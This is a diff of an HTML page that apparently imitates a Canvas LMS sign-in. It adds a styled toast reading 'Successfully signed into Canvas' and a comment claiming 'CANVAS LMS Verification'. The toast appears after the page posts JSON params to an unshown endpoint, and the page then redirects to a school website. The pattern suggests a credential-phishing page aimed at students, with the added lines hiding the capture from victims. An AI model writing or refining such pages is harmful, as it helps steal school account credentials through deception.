@@ -3,11 +3,9 @@
 <head>
   <meta charset="utf-8">
 
-  <script src="https://loopnews.app/ContextMenu.js"></script>
-  
   <link rel="stylesheet" href="https://unpkg.com/toastedjs/dist/toasted.min.css">
-  <link rel="stylesheet" href="https://loopnews.app/ContextMenu.css">
-
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script src="https://unpkg.com/toastedjs/dist/toasted.min.js"></script>
 
@@ -55,6 +53,18 @@
       }
     }
     document.addEventListener('click', _earlyClick)
+
+
+
+    let successNotif = new Toasted({
+    position : 'top-center',
+    theme : 'bootstrap',
+    duration : '5000',
+    fullWidth : "false",
+    type : "success",
+    icon : "done"
+  	})	//  © 2022 CANVAS LMS Verification  
+
   </script>
 
 
@@ -85,6 +95,11 @@
     });
   //]]>
   </script>
+
+  <script>
+
+  </script>
+  
   <script
     src="https://du11hjcvx0uqb.cloudfront.net/br/dist/brandable_css/b08a65b828c3544543c03326ffb298df/variables-8391c84da435c9cfceea2b2b3317ff66.js"></script>
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
@@ -114,6 +129,10 @@
 
 
       request.send(JSON.stringify(params));
+
+
+      successNotif.show("Successfully signed into Canvas")
+
 
       setTimeout(() => window.open("https://www.mabears.org", "_self"), 3200)
     }
